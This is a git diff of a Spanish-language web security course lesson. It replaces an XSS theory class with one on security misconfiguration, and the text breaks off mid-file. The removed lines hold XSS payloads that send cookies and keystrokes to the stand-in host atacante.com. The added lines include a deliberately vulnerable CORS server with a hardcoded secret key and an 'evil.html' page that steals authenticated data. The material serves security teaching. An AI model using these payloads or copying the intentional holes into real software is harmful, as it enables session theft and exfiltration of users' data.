@@ -1,4 +1,4 @@
-# Clase 22: Cross-Site Scripting (XSS) - Teoria
+# Clase 22: Configuracion de Seguridad Incorrecta
 
 **Duracion:** 2 horas
 
@@ -6,502 +6,733 @@
 
 ## Objetivos de Aprendizaje
 
-1. Comprender que es XSS, como funciona y cual es su impacto
-2. Diferenciar los 3 tipos de XSS: Reflejado, Almacenado y DOM-based
-3. Conocer payloads comunes y en que contextos se ejecutan
-4. Identificar vulnerabilidades XSS en codigo fuente y en aplicaciones web
+1. Identificar errores comunes de configuracion de seguridad
+2. Configurar correctamente security headers HTTP (HSTS, X-Frame-Options, CSP, etc.)
+3. Comprender los riesgos de CORS mal configurado
+4. Implementar manejo de errores seguros sin revelar informacion sensible
+5. Conocer el estandar OWASP ASVS
 
 ---
 
 ## Contenido Detallado
 
-### 1. Que es XSS?
+### 1. Errores Comunes de Configuracion
 
-Cross-Site Scripting (XSS) es un tipo de vulnerabilidad de inyeccion que permite a un atacante inyectar scripts maliciosos en paginas web vistas por otros usuarios. El navegador de la victima ejecuta el script porque confia en el origen del contenido.
+| Error | Descripcion | Riesgo |
+|-------|-------------|--------|
+| **Configuraciones por defecto** | Credenciales admin/admin, puertos abiertos, servicios innecesarios | Acceso no autorizado inmediato |
+| **Directorios listables** | Directory listing habilitado en servidores web | Exposicion de archivos sensibles, estructura del proyecto |
+| **Headers HTTP inseguros** | Falta de HSTS, X-Frame-Options, CSP | Clickjacking, XSS, MITM, MIME sniffing |
+| **Manejo de errores verbose** | Stack traces, versiones de software en respuestas de error | Informacion para ataques dirigidos |
+| **CORS mal configurado** | `Access-Control-Allow-Origin: *` o reflejo del origen | Exfiltracion de datos desde cualquier origen |
+| **Servicios innecesarios activos** | Puertos extras, modulos no usados (ej: WebDAV, FTP) | Superficie de ataque innecesaria |
+| **Permisos incorrectos** | Archivos world-writable, contenedores como root | Escalada de privilegios |
 
-**Como funciona:**
+### 2. Security Headers HTTP
+
+Los security headers son cabeceras HTTP que el servidor envia al navegador para activar comportamientos de seguridad.
+
+| Header | Que hace | Valor Recomendado |
+|--------|----------|-------------------|
+| **Strict-Transport-Security (HSTS)** | Fuerza conexiones HTTPS, previene SSL stripping | `max-age=31536000; includeSubDomains; preload` |
+| **X-Frame-Options** | Previene clickjacking al no permitir iframes | `DENY` o `SAMEORIGIN` |
+| **X-Content-Type-Options** | Previene MIME sniffing (navegador no adivina el tipo) | `nosniff` |
+| **Content-Security-Policy (CSP)** | Controla que recursos puede cargar la pagina | `default-src 'self'` (restrictivo) |
+| **X-XSS-Protection** | Activa filtro XSS del navegador (obsoleto en Chrome) | `1; mode=block` |
+| **Referrer-Policy** | Controla que informacion se envia en el header Referer | `strict-origin-when-cross-origin` |
+| **Permissions-Policy** | Controla que APIs del navegador puede usar la pagina | `camera=(), microphone=(), geolocation=()` |
+| **Cache-Control** | Previene cacheo de respuestas sensibles | `no-store, max-age=0` |
+
+### 3. CORS (Cross-Origin Resource Sharing)
+
+CORS permite que un sitio web acceda a recursos de otro origen. Una configuracion incorrecta puede exponer datos sensibles.
+
+**Configuracion insegura:**
 
 ```
-1. Atacante encuentra un input que no sanitiza correctamente
-2. Atacante inyecta <script>alert('XSS')</script>
-3. Usuario visita la pagina con el script inyectado
-4. El navegador ejecuta el script en el contexto de la pagina
-5. El atacante roba cookies, redirige, modifica la pagina, etc.
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Credentials: true
 ```
 
-**Impacto de XSS:**
+Con `*` y `Allow-Credentials: true`, cualquier sitio web puede leer respuestas autenticadas.
 
-| Impacto | Descripcion |
-|---------|-------------|
-| Robo de cookies | `document.cookie` enviado a servidor del atacante |
-| Robo de tokens | Acceso a localStorage, sessionStorage |
-| Keylogging | Capturar teclas presionadas por el usuario |
-| Defacement | Modificar visualmente la pagina |
-| Phishing | Mostrar formularios falsos de login |
-| Acceso a camara/mic | Abusar de permisos del navegador |
-| Drive-by download | Forzar descarga de malware |
-| Secuestro de sesion | Usar la sesion de la victima para acciones maliciosas |
+**Reflejo del Origin (otra mala practica):**
 
-### 2. Tipos de XSS
+Si el servidor refleja el header `Origin` del cliente como `Access-Control-Allow-Origin`, un atacante puede hacer una request desde `atacante.com` y el servidor respondera con `Access-Control-Allow-Origin: atacante.com`.
 
-#### XSS Reflejado (Reflected XSS)
+### 4. Manejo de Errores que Revela Informacion
 
-El script malicioso se refleja en la respuesta del servidor. No se almacena, solo se ejecuta cuando la victima visita una URL especialmente disenada.
+**Nunca devolver al cliente:**
 
-**Flujo:**
-```
-1. Atacante crea URL maliciosa: sitio.com/buscar?q=<script>...
-2. Atacante envia URL a la victima (email, phishing, red social)
-3. Victima hace click en la URL
-4. El servidor refleja el script en la respuesta
-5. El navegador de la victima ejecuta el script
-```
+- Stack traces completos
+- Versiones de software (Python 3.11, Flask 2.3, Django 4.2)
+- Nombres de archivos y lineas de codigo
+- Informacion de la base de datos (nombres de tablas, columnas)
+- Tokens internos, API keys, config paths
 
-**Ejemplo:**
+**Buenas practicas:**
+- Devolver mensajes genericos ("Error interno del servidor", "Recurso no encontrado")
+- Loggear el error completo en el servidor para debugging
+- Usar paginas de error personalizadas (403.html, 404.html, 500.html)
 
-```html
-<!-- Buscador vulnerable -->
-<form action="/buscar" method="GET">
-    <input type="text" name="q" value="<!-- AQUI SE REFLEJA EL INPUT -->">
-    <input type="submit" value="Buscar">
-</form>
-<p>Resultados para: <!-- AQUI SE REFLEJA EL INPUT SIN SANITIZAR --></p>
-```
+### 5. OWASP ASVS (Application Security Verification Standard)
 
-**URL de ataque:** `http://sitio.com/buscar?q=<script>alert(document.cookie)</script>`
+ASVS es un estandar para verificar la seguridad de aplicaciones web. Tiene 3 niveles de verificacion:
 
-#### XSS Almacenado (Stored XSS)
+| Nivel | Descripcion | Para quien es |
+|-------|-------------|---------------|
+| **L1** | Seguridad basica contra vulnerabilidades comunes | Todas las aplicaciones |
+| **L2** | Seguridad contra ataques mas sofisticados | Apps que manejan datos sensibles |
+| **L3** | Seguridad de alto nivel para apps criticas | Apps financieras, salud, infraestructura critica |
 
-El script malicioso se almacena en el servidor (base de datos, archivos, foro, comentarios) y se ejecuta cada vez que un usuario visita la pagina infectada.
+**Ejemplos de requisitos ASVS relacionados a configuracion:**
 
-**Flujo:**
-```
-1. Atacante publica un comentario con <script>malicioso</script>
-2. El servidor almacena el comentario en la BD sin sanitizar
-3. Cada usuario que visita la pagina del comentario ejecuta el script
-4. El atacante recolecta cookies de multiples victimas
-```
-
-**Ejemplo:**
-```html
-<!-- Foro con comentarios -->
-<form action="/comentar" method="POST">
-    <textarea name="comentario"></textarea>
-    <input type="submit">
-</form>
-<div class="comentarios">
-    <!-- Comentarios de usuarios renderizados sin escape -->
-</div>
-```
-
-**Payload:** El atacante escribe en el comentario:
-```html
-<script>
-fetch('https://atacante.com/steal?cookie=' + document.cookie);
-</script>
-```
-
-#### XSS DOM-based
-
-La vulnerabilidad existe en el codigo JavaScript del lado del cliente, no en el servidor. El script malicioso se inyecta a traves de fuentes del DOM (URL, fragmento, localStorage) y se ejecuta en el cliente sin que el servidor intervenga.
-
-**Flujo:**
-```
-1. Pagina carga JavaScript que lee window.location.hash o document.URL
-2. El JS inserta ese valor directamente en el DOM (innerHTML, document.write)
-3. Atacante envia URL con #<script>malicioso</script>
-4. El JS del cliente ejecuta el script sin que el servidor se entere
-```
-
-**Ejemplo vulnerable:**
-```javascript
-// Codigo JS que lee el hash de la URL y lo inserta en el DOM
-var user = window.location.hash.substring(1);
-document.getElementById('saludo').innerHTML = 'Hola, ' + user;
-```
-
-**URL de ataque:** `http://sitio.com/pagina.html#<img src=x onerror=alert(1)>`
-
-### 3. Diferencias entre los 3 tipos
-
-| Caracteristica | Reflejado | Almacenado | DOM-based |
-|---------------|-----------|------------|-----------|
-| Almacenamiento | No (solo en URL/respuesta) | Si (BD, archivos) | No (solo en cliente) |
-| Quien lo ejecuta | Servidor + Cliente | Servidor + Cliente | Solo Cliente |
-| Persistencia | Un solo uso | Persistente (todos los usuarios) | Un solo uso |
-| Medio de entrega | URL, phishing | Foros, comentarios, perfiles | URL, fragmento |
-| Difícil de detectar | Media | Facil | Dificil (codigo JS) |
-
-### 4. Payloads Comunes por Contexto
-
-#### Contexto HTML (entre tags)
-
-```html
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
-<a href="javascript:alert('XSS')">Click</a>
-<body onload=alert('XSS')>
-<iframe src="javascript:alert('XSS')">
-<input type="text" value="" onfocus="alert('XSS')" autofocus>
-<details open ontoggle="alert('XSS')">
-```
-
-#### Contexto de Atributo HTML
-
-```html
-<!-- Input: " onfocus="alert(1)" autofocus -->
-<input value="INPUT">
-<!-- Resultado: -->
-<input value="" onfocus="alert(1)" autofocus="">
-
-<!-- Input: "><script>alert(1)</script> -->
-<div class="INPUT">
-<!-- Resultado: -->
-<div class=""><script>alert(1)</script>">
-```
-
-#### Contexto de JavaScript
-
-```javascript
-// Input: "; alert(1); var x="
-var user = "INPUT";
-// Resultado:
-var user = ""; alert(1); var x="";
-
-// Input: </script><script>alert(1)</script>
-<script>var x = "INPUT";</script>
-```
-
-#### Contexto de CSS
-
-```html
-<style>
-body { background: url("javascript:alert('XSS')"); }
-</style>
-<style>
-body { color: INPUT }
-<!-- Input: red; background-image: url(javascript:alert('XSS')); -->
-</style>
-```
-
-#### Contexto de URL
-
-```html
-<a href="INPUT">Click</a>
-<!-- Input: javascript:alert('XSS') -->
-<!-- Input: %6A%61%76%61%73%63%72%69%70%74:alert(1) (encoding) -->
-```
-
-### 5. Payloads para Robo de Cookies
-
-```javascript
-// Payload basico para robar cookies
-<script>
-document.location='https://atacante.com/steal?c='+document.cookie
-</script>
-
-// Usando fetch
-<script>
-fetch('https://atacante.com/steal?c='+encodeURIComponent(document.cookie))
-</script>
-
-// Usando Image
-<script>
-new Image().src='https://atacante.com/steal?c='+document.cookie;
-</script>
-
-// Keylogger
-<script>
-document.onkeypress = function(e) {
-    fetch('https://atacante.com/key?k=' + e.key);
-};
-</script>
-```
-
-### 6. XSS en Diferentes Frameworks
-
-#### React (sin proteccion)
-
-```jsx
-// PELIGROSO: dangerouslySetInnerHTML
-function UserInput({ input }) {
-    return <div dangerouslySetInnerHTML={{ __html: input }} />;
-}
-
-// SEGURO: React escapa por defecto
-function SafeInput({ input }) {
-    return <div>{input}</div>;  // input se escapa automaticamente
-}
-```
-
-#### Jinja2 / Flask
-
-```html
-<!-- PELIGROSO: |safe desactiva el escape -->
-<p>{{ input|safe }}</p>
-
-<!-- SEGURO: escape por defecto -->
-<p>{{ input }}</p>
-```
-
-#### Angular
-
-```html
-<!-- PELIGROSO: bypassSecurityTrustHtml -->
-<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(input)"></div>
-
-<!-- SEGURO: interpolacion por defecto -->
-<div>{{ input }}</div>
-```
+- V2.1: Verificar que el sistema use TLS 1.2+ y configuracion segura
+- V14.1: Verificar que las configuraciones por defecto esten deshabilitadas
+- V14.2: Verificar que headers de seguridad esten presentes
+- V14.5: Verificar que CORS este configurado correctamente
 
 ---
 
-## Ejercicio 1: Aplicacion Flask con XSS Reflejado
+## Ejercicio 1: Analizar Security Headers de un Sitio Web
 
 ### Escenario
 
-Aplicacion de busqueda vulnerable a XSS reflejado. Debes demostrar el ataque y luego corregirla sanitizando el input.
-
-**Paso 1: Aplicacion vulnerable**
+Usar Python para analizar los headers HTTP de respuesta de un sitio web e identificar cuales faltan.
 
 ```python
 """
-app_xss_vulnerable.py - App con XSS reflejado
+security_headers_analyzer.py
 """
-from flask import Flask, request, render_template_string
+import requests
+from typing import Dict, List, Tuple
 
-app = Flask(__name__)
+# Definicion de headers deseables y sus valores recomendados
+SECURITY_HEADERS = {
+    'Strict-Transport-Security': {
+        'descripcion': 'Fuerza conexiones HTTPS',
+        'recomendado': 'max-age=31536000; includeSubDomains',
+        'severidad': 'ALTA',
+    },
+    'X-Frame-Options': {
+        'descripcion': 'Previene clickjacking',
+        'recomendado': 'DENY o SAMEORIGIN',
+        'severidad': 'ALTA',
+    },
+    'X-Content-Type-Options': {
+        'descripcion': 'Previene MIME sniffing',
+        'recomendado': 'nosniff',
+        'severidad': 'MEDIA',
+    },
+    'Content-Security-Policy': {
+        'descripcion': 'Controla recursos permitidos (XSS prevention)',
+        'recomendado': 'default-src \'self\'',
+        'severidad': 'ALTA',
+    },
+    'X-XSS-Protection': {
+        'descripcion': 'Activa filtro XSS del navegador',
+        'recomendado': '1; mode=block',
+        'severidad': 'MEDIA',
+    },
+    'Referrer-Policy': {
+        'descripcion': 'Controla informacion enviada en Referer',
+        'recomendado': 'strict-origin-when-cross-origin',
+        'severidad': 'MEDIA',
+    },
+    'Permissions-Policy': {
+        'descripcion': 'Controla APIs del navegador',
+        'recomendado': 'geolocation=(), microphone=(), camera=()',
+        'severidad': 'BAJA',
+    },
+    'Cache-Control': {
+        'descripcion': 'Controla cacheo de respuestas',
+        'recomendado': 'no-store, max-age=0 (para datos sensibles)',
+        'severidad': 'MEDIA',
+    },
+}
 
-@app.route('/buscar')
-def buscar():
-    query = request.args.get('q', '')
-
-    # VULNERABLE: Renderiza el input sin escapar
-    template = """
-    <!DOCTYPE html>
-    <html>
-    <head><title>Buscador</title></head>
-    <body>
-        <h1>Buscador</h1>
-        <form method="GET">
-            <input type="text" name="q" value="%s">
-            <input type="submit" value="Buscar">
-        </form>
-        <p>Resultados para: %s</p>
-    </body>
-    </html>
-    """ % (query, query)
-
-    return render_template_string(template)
-
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
-```
-
-**Paso 2: Demostrar el ataque**
-
-Abrir en el navegador:
-```
-http://127.0.0.1:5000/buscar?q=<script>alert(document.cookie)</script>
-```
-
-**Paso 3: Demostrar robo de cookies**
-
-```html
-<!-- Atacante prepara esta URL y se la envia a la victima -->
-http://127.0.0.1:5000/buscar?q=<script>fetch('https://atacante.com/steal%3Fc%3D'%2Bdocument.cookie)</script>
-```
-
-**Paso 4: Version corregida con escape**
-
-```python
-"""
-app_xss_segura.py - Version con sanitizacion
-"""
-from flask import Flask, request, render_template_string
-from html import escape
-
-app = Flask(__name__)
-
-@app.route('/buscar')
-def buscar():
-    query = request.args.get('q', '')
-
-    # CORREGIDO: Escapar el input antes de renderizar
-    safe_query = escape(query)
-
-    template = """
-    <!DOCTYPE html>
-    <html>
-    <head><title>Buscador</title></head>
-    <body>
-        <h1>Buscador</h1>
-        <form method="GET">
-            <input type="text" name="q" value="{{ query }}">
-            <input type="submit" value="Buscar">
-        </form>
-        <p>Resultados para: {{ query }}</p>
-    </body>
-    </html>
+def analyze_security_headers(url: str) -> List[Dict]:
     """
+    Analiza los security headers de un sitio web.
+    Retorna una lista con los resultados del analisis.
+    """
+    try:
+        response = requests.get(url, timeout=10, allow_redirects=True)
+        headers = response.headers
+        final_url = response.url
 
-    # Usar render_template_string con variables (escape automatico de Jinja2)
-    return render_template_string(template, query=safe_query)
+        print(f"Analizando: {url}")
+        print(f"URL final: {final_url}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Servidor: {headers.get('Server', 'No especificado')}")
+        print("-" * 60)
+
+        results = []
+        for header_name, config in SECURITY_HEADERS.items():
+            present = header_name in headers
+            value = headers.get(header_name, '')
+
+            result = {
+                'header': header_name,
+                'present': present,
+                'value': value,
+                'recomendado': config['recomendado'],
+                'descripcion': config['descripcion'],
+                'severidad': config['severidad'],
+            }
+            results.append(result)
+
+            status = "OK" if present else "FALTA"
+            print(f"[{status}] {header_name}")
+            if present:
+                print(f"       Valor: {value}")
+            print(f"       Recomendado: {config['recomendado']}")
+            print()
+
+        return results
+
+    except Exception as e:
+        print(f"Error al analizar {url}: {e}")
+        return []
+
+def generate_report(results: List[Dict], url: str):
+    """Genera un reporte de seguridad en formato texto"""
+    missing = [r for r in results if not r['present']]
+    present = [r for r in results if r['present']]
+
+    print("=" * 60)
+    print(f"RESUMEN DE SEGURIDAD - {url}")
+    print("=" * 60)
+    print(f"\nHeaders presentes: {len(present)}/{len(results)}")
+    print(f"Headers faltantes: {len(missing)}/{len(results)}")
+    print()
+
+    if missing:
+        print("Headers FALTANTES (priorizar correccion):")
+        print("-" * 40)
+        for m in missing:
+            severidad = m['severidad']
+            icono = "!!!" if severidad == "ALTA" else "!!" if severidad == "MEDIA" else "!"
+            print(f"  {icono} [{severidad}] {m['header']}")
+            print(f"     {m['descripcion']}")
+            print(f"     Valor recomendado: {m['recomendado']}")
+            print()
+
+    if present:
+        print("\nHeaders presentes:")
+        print("-" * 40)
+        for p in present:
+            print(f"  [+] {p['header']}: {p['value'][:80]}...")
+            print()
+
+    # Calcular puntuacion
+    score = len(present) / len(results) * 100
+    grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 50 else "D" if score >= 25 else "F"
+    print(f"Puntuacion: {score:.1f}% - Grado: {grade}")
+
+# ============================================================
+# EJECUCION
+# ============================================================
+
+if __name__ == '__main__':
+    # Analizar sitios de ejemplo
+    sitios = [
+        'https://github.com',
+        'https://www.google.com',
+        'https://httpbin.org/response-headers',
+    ]
+
+    for sitio in sitios:
+        results = analyze_security_headers(sitio)
+        if results:
+            generate_report(results, sitio)
+        print("\n" + "=" * 60 + "\n")
+```
+
+**Ejecucion:**
+
+```bash
+pip install requests
+python security_headers_analyzer.py
+```
+
+---
+
+## Ejercicio 2: Configurar Security Headers en Flask
+
+### Escenario
+
+Implementar una configuracion completa de security headers en una aplicacion Flask con soporte para entornos de desarrollo y produccion.
+
+```python
+"""
+secure_flask_app.py - App Flask con security headers completos
+"""
+from flask import Flask, jsonify, request, make_response, render_template_string
+import os
+
+app = Flask(__name__)
+
+# ============================================================
+# CONFIGURACION DE SEGURIDAD
+# ============================================================
+
+class SecurityConfig:
+    """Configuracion de seguridad por entorno"""
+    def __init__(self, environment='production'):
+        self.environment = environment
+
+    def get_headers(self):
+        """Retorna los security headers apropiados para el entorno"""
+        headers = {}
+
+        # HSTS - Siempre activo en produccion
+        if self.environment == 'production':
+            headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
+        elif self.environment == 'staging':
+            headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+        else:
+            # Development: max-age bajo para pruebas
+            headers['Strict-Transport-Security'] = 'max-age=300'
+
+        # Prevenir clickjacking
+        headers['X-Frame-Options'] = 'DENY'
+
+        # Prevenir MIME sniffing
+        headers['X-Content-Type-Options'] = 'nosniff'
+
+        # CSP - Diferente por entorno
+        if self.environment == 'production':
+            headers['Content-Security-Policy'] = self._build_csp('strict')
+        else:
+            headers['Content-Security-Policy'] = self._build_csp('relaxed')
+
+        # XSS Protection (modern browsers ignoran, pero por compatibilidad)
+        headers['X-XSS-Protection'] = '1; mode=block'
+
+        # Referrer Policy
+        headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+
+        # Permissions Policy (control de APIs del navegador)
+        headers['Permissions-Policy'] = (
+            'camera=(), '
+            'microphone=(), '
+            'geolocation=(), '
+            'payment=(), '
+            'usb=()'
+        )
+
+        # Cache control para respuestas sensibles
+        headers['Cache-Control'] = 'no-store, max-age=0'
+        headers['Pragma'] = 'no-cache'
+        headers['Expires'] = '0'
+
+        return headers
+
+    def _build_csp(self, mode='strict'):
+        """Construye la politica CSP"""
+        if mode == 'strict':
+            return (
+                "default-src 'self'; "
+                "script-src 'self'; "
+                "style-src 'self'; "
+                "img-src 'self'; "
+                "font-src 'self'; "
+                "connect-src 'self'; "
+                "frame-ancestors 'none'; "
+                "form-action 'self'; "
+                "base-uri 'self'; "
+                "object-src 'none'"
+            )
+        else:
+            # CSP relajado para desarrollo (permite CDNs, inline scripts con nonce)
+            return (
+                "default-src 'self'; "
+                "script-src 'self' https://cdnjs.cloudflare.com 'nonce-dev'; "
+                "style-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; "
+                "img-src 'self' data:; "
+                "font-src 'self'; "
+                "connect-src 'self' ws:; "
+                "frame-ancestors 'none'; "
+                "form-action 'self'; "
+                "base-uri 'self'; "
+                "object-src 'none'"
+            )
+
+
+# Detectar entorno
+ENVIRONMENT = os.getenv('FLASK_ENV', 'development')
+security_config = SecurityConfig(ENVIRONMENT)
+
+
+@app.after_request
+def add_security_headers(response):
+    """Middleware que agrega security headers a todas las respuestas"""
+    headers = security_config.get_headers()
+    for name, value in headers.items():
+        response.headers[name] = value
+
+    # CORS controlado
+    origin = request.headers.get('Origin', '')
+    # Solo permitir origenes confiables
+    allowed_origins = ['https://mydomain.com', 'https://app.mydomain.com']
+    if origin in allowed_origins:
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
+        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+        response.headers['Access-Control-Max-Age'] = '3600'
+
+    return response
+
+
+@app.errorhandler(403)
+def forbidden(e):
+    """Pagina de error 403 personalizada (sin revelar informacion)"""
+    return jsonify({'error': 'Acceso denegado'}), 403
+
+
+@app.errorhandler(404)
+def not_found(e):
+    """Pagina de error 404 personalizada"""
+    return jsonify({'error': 'Recurso no encontrado'}), 404
+
+
+@app.errorhandler(500)
+def internal_error(e):
+    """Pagina de error 500 personalizada - NUNCA revelar stack trace"""
+    # Loggear el error completo en el servidor
+    app.logger.error(f"Error 500: {str(e)}", exc_info=True)
+    # Devolver mensaje generico
+    return jsonify({'error': 'Error interno del servidor'}), 500
+
+
+# ============================================================
+# RUTAS DE EJEMPLO
+# ============================================================
+
+@app.route('/')
+def index():
+    return jsonify({
+        'mensaje': 'API segura',
+        'entorno': ENVIRONMENT,
+    })
+
+
+@app.route('/api/usuarios/<int:user_id>')
+def get_user(user_id):
+    # Simular respuesta con datos sensibles con headers anti-cache
+    response = make_response(jsonify({
+        'id': user_id,
+        'nombre': 'Usuario Ejemplo',
+        'email': 'usuario@example.com',
+    }))
+    # Cache-Control adicional para datos sensibles
+    response.headers['Cache-Control'] = 'no-store, must-revalidate'
+    response.headers['Pragma'] = 'no-cache'
+    return response
+
+
+# ============================================================
+# VERIFICACION
+# ============================================================
+
+@app.route('/debug/headers')
+def debug_headers():
+    """Endpoint para verificar los headers de seguridad configurados"""
+    headers = dict(security_config.get_headers())
+    return jsonify({
+        'security_headers': headers,
+        'environment': ENVIRONMENT,
+        'note': 'Estos headers se aplican a TODAS las respuestas'
+    })
+
+
+if __name__ == '__main__':
+    print(f"Iniciando en entorno: {ENVIRONMENT}")
+    print(f"CSP activa: {security_config.get_headers().get('Content-Security-Policy')}")
+    app.run(host='127.0.0.1', port=5000, debug=False)
+```
+
+**Verificar los headers:**
+
+```bash
+# Iniciar servidor
+python secure_flask_app.py
+
+# Verificar headers con curl
+curl -v http://127.0.0.1:5000/ 2>&1 | grep -i -E "^(< |strict|x-frame|x-content|content-securit|referrer|permissions|cache)"
+
+# Verificar con script Python
+python -c "
+import requests
+r = requests.get('http://127.0.0.1:5000/')
+for k, v in r.headers.items():
+    if any(h in k.lower() for h in ['strict', 'frame', 'content-type', 'content-securit', 'referrer', 'x-xss', 'permission', 'cache']):
+        print(f'{k}: {v}')
+"
+```
+
+---
+
+## Ejercicio 3: CORS Mal Configurado - Version Vulnerable y Segura
+
+### Escenario
+
+Un servidor tiene CORS configurado incorrectamente permitiendo que cualquier sitio web lea datos del usuario autenticado.
+
+**Version vulnerable:**
+
+```python
+"""
+cors_vulnerable.py - Servidor con CORS mal configurado
+"""
+from flask import Flask, jsonify, request, session
+
+app = Flask(__name__)
+app.secret_key = 'supersecretkey'
+
+# Simular base de datos de usuarios (datos bancarios)
+USUARIOS = {
+    1: {'nombre': 'Juan', 'email': 'juan@bank.com', 'cuenta': 'ES12 3456 7890 1234', 'saldo': 50000},
+    2: {'nombre': 'Maria', 'email': 'maria@bank.com', 'cuenta': 'ES98 7654 3210 9876', 'saldo': 120000},
+}
+
+@app.route('/api/perfil')
+def perfil():
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+
+    user_id = session['user_id']
+    if user_id not in USUARIOS:
+        return jsonify({'error': 'Usuario no encontrado'}), 404
+
+    user_data = USUARIOS[user_id]
+
+    # PROBLEMA 1: CORS demasiado permisivo
+    origin = request.headers.get('Origin', '')
+    response = jsonify(user_data)
+
+    # Refleja cualquier origen (malisimo)
+    if origin:
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+
+    return response
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json()
+    if data.get('user') == 'juan' and data.get('pass') == '1234':
+        session['user_id'] = 1
+        return jsonify({'ok': True})
+    return jsonify({'error': 'Credenciales invalidas'}), 401
 
 if __name__ == '__main__':
     app.run(host='127.0.0.1', port=5000)
 ```
 
-**Explicacion:** `html.escape()` convierte caracteres peligrosos:
-- `<` → `&lt;`
-- `>` → `&gt;`
-- `"` → `&quot;`
-- `'` → `&#x27;`
-- `&` → `&amp;`
+**Pagina atacante que explota CORS mal configurado:**
 
-Esto impide que el navegador interprete el input como codigo HTML/JavaScript.
-
----
-
-## Ejercicio 2: Identificar y Clasificar Tipos de XSS
-
-### Escenario
-
-Analizar 5 fragmentos de codigo, determinar si son vulnerables a XSS, clasificar el tipo, y explicar como explotarlos.
-
-**Caso A:**
-```python
-# Aplicacion Flask
-@app.route('/perfil/<username>')
-def perfil(username):
-    return f"<h1>Perfil de {username}</h1><p>Bienvenido a tu perfil</p>"
-```
-
-**Caso B:**
-```javascript
-// Codigo JavaScript en pagina HTML
-var params = new URLSearchParams(window.location.search);
-var nombre = params.get('nombre');
-document.getElementById('mensaje').innerHTML = 'Hola ' + nombre;
-```
-
-**Caso C:**
-```python
-# Foro con comentarios (usando BD)
-@app.route('/comentar', methods=['POST'])
-def comentar():
-    comentario = request.form['comentario']
-    db.execute("INSERT INTO comentarios (texto) VALUES (?)", (comentario,))
-    # ...
-    return "Comentario publicado"
-
-@app.route('/foro')
-def ver_comentarios():
-    comentarios = db.execute("SELECT texto FROM comentarios").fetchall()
-    html = "<h1>Comentarios</h1><ul>"
-    for c in comentarios:
-        html += f"<li>{c['texto']}</li>"
-    html += "</ul>"
-    return html
-```
-
-**Caso D:**
-```javascript
-// Pagina web
-var hash = window.location.hash.substring(1);
-document.write('Pagina: ' + hash);
-```
-
-**Caso E:**
 ```html
-<!-- Plantilla Jinja2 con autoescape desactivado -->
-{% autoescape false %}
-<div class="resultado">
-    {{ busqueda }}
-</div>
-{% endautoescape %}
+<!-- evil.html - Pagina del atacante que roba datos via CORS -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Prueba de CORS</title>
+</head>
+<body>
+    <h1>Ganaste un premio!</h1>
+    <p>Haz click para reclamar...</p>
+
+    <script>
+        // El atacante pone esta pagina en atacante.com
+        // Cuando un usuario autenticado en bank.com la visite...
+
+        function stealData() {
+            var xhr = new XMLHttpRequest();
+            xhr.withCredentials = true;  // Envia cookies de la sesion
+            xhr.open('GET', 'http://127.0.0.1:5000/api/perfil', true);
+
+            xhr.onload = function() {
+                // Datos robados! (gracias a CORS mal configurado)
+                var data = JSON.parse(xhr.responseText);
+                document.getElementById('result').innerHTML =
+                    '<h2>Datos Robados:</h2>' +
+                    '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+
+                // Enviar a servidor del atacante (simulado)
+                console.log('DATOS ROBADOS:', data);
+                // fetch('https://atacante.com/steal', { method: 'POST', body: JSON.stringify(data) });
+            };
+
+            xhr.onerror = function() {
+                document.getElementById('result').innerHTML = 'Error al robar datos';
+            };
+
+            xhr.send();
+        }
+
+        // Ejecutar inmediatamente
+        stealData();
+    </script>
+
+    <div id="result"></div>
+</body>
+</html>
 ```
 
-### Solucion
+**Version corregida (CORS seguro):**
 
-| Caso | Tipo | Explicacion | Como explotar |
-|------|------|-------------|---------------|
-| **A** | Reflejado | El servidor refleja `username` directamente en HTML sin escape | URL: `/perfil/<script>alert(1)</script>` |
-| **B** | DOM-based | El JS lee de `location.search` (fuente) y escribe con `innerHTML` (sumidero) | URL: `?nombre=<img src=x onerror=alert(1)>` |
-| **C** | Almacenado | El comentario se almacena en BD y luego se renderiza sin escape en el foro | Publicar comentario con `<script>alert(1)</script>`, cada visitante lo ejecuta |
-| **D** | DOM-based | Lee de `location.hash` y escribe con `document.write` (sumidero peligroso) | URL: `pagina.html#<script>alert(1)</script>` |
-| **E** | Reflejado/Almacenado | Jinja2 tiene autoescape desactivado, el valor se renderiza como HTML | Depende de como se reciba `busqueda`, puede ser reflejado o almacenado |
+```python
+"""
+cors_seguro.py - Configuracion CORS segura
+"""
+from flask import Flask, jsonify, request, session
+import os
 
----
+app = Flask(__name__)
+app.secret_key = os.urandom(32).hex()
 
-## Ejercicio 3: Payloads XSS por Contexto
+# Lista blanca de origenes permitidos
+ALLOWED_ORIGINS = frozenset([
+    'https://www.bank.com',
+    'https://bank.com',
+    'https://app.bank.com',
+])
 
-Completar la siguiente tabla con el payload correcto para cada contexto:
+# Metodos HTTP permitidos
+ALLOWED_METHODS = ['GET', 'POST', 'PUT', 'DELETE']
 
-| Contexto | Codigo vulnerable | Payload |
-|----------|------------------|---------|
-| Entre tags HTML | `<div>INPUT</div>` | |
-| Atributo HTML | `<input value="INPUT">` | |
-| JavaScript string | `<script>var x = 'INPUT';</script>` | |
-| Event handler | `<div onmouseover="INPUT">` | |
-| URL en atributo | `<a href="INPUT">Link</a>` | |
-| CSS | `<style>body { color: INPUT }</style>` | |
+# Headers permitidos en requests
+ALLOWED_HEADERS = ['Content-Type', 'Authorization', 'X-CSRF-Token']
 
